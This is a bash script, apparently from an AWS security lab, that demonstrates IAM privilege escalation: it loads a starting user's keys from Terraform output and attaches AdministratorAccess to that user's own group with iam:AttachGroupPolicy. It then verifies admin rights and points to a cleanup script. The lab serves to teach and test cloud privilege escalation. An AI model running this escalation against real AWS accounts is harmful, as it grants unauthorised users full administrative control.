#!/bin/bash

# Demo script for iam:AttachGroupPolicy privilege escalation
# This script demonstrates how a user with AttachGroupPolicy permission can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-one-hop-agp-starting-user"
GROUP_NAME="pl-prod-one-hop-agp-group"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM AttachGroupPolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_attachgrouppolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and group name
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
GROUP_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.group_name')

if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Step 2: Verify identity
echo -e "${YELLOW}Step 2: Verifying identity${NC}"
unset AWS_SESSION_TOKEN

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Check current permissions (should be limited)
echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
echo "Attempting to list S3 buckets (should fail)..."
if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
    echo -e "${GREEN}✓ Confirmed limited permissions (cannot list S3 buckets)${NC}"
else
    echo -e "${YELLOW}Warning: Unexpected permissions${NC}"
fi
echo ""

# Step 5: Verify group membership
echo -e "${YELLOW}Step 5: Verifying group membership${NC}"
USER_GROUPS=$(aws iam list-groups-for-user --user-name $STARTING_USER --query 'Groups[*].GroupName' --output text)
echo "User is member of groups: $USER_GROUPS"

if [[ $USER_GROUPS == *"$GROUP_NAME"* ]]; then
    echo -e "${GREEN}✓ Confirmed membership in $GROUP_NAME${NC}\n"
else
    echo -e "${RED}Error: User is not a member of $GROUP_NAME${NC}"
    exit 1
fi

# Step 6: Attach AdministratorAccess policy to the group
echo -e "${YELLOW}Step 6: Attaching AdministratorAccess policy to group${NC}"
echo "This is the privilege escalation vector..."

ADMIN_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"

aws iam attach-group-policy \
    --group-name $GROUP_NAME \
    --policy-arn $ADMIN_POLICY_ARN

echo "Attached policy: $ADMIN_POLICY_ARN to group: $GROUP_NAME"
echo -e "${GREEN}✓ Successfully attached admin policy to group${NC}\n"

# Sleep to allow policy propagation
echo -e "${GREEN}✓ Sleeping for 15 seconds to let the policy propagate${NC}\n"
sleep 15

# Step 7: Verify admin access
echo -e "${YELLOW}Step 7: Verifying administrator access${NC}"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

# Test admin permissions
echo "Testing admin permissions (listing IAM users)..."
IAM_USERS=$(aws iam list-users --query 'Users[*].UserName' --output text | head -5)
echo "Successfully listed IAM users: $IAM_USERS"
echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: User is member of group ${YELLOW}$GROUP_NAME${NC}"
echo -e "Step 2: Attached ${YELLOW}AdministratorAccess${NC} to the group"
echo -e "Step 3: Gained ${GREEN}Administrator Access${NC} via group membership"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (iam:AttachGroupPolicy) → $GROUP_NAME → AdministratorAccess → Admin"
echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to detach the admin policy${NC}"
echo ""

# Cleanup instructions
echo -e "${YELLOW}To clean up:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
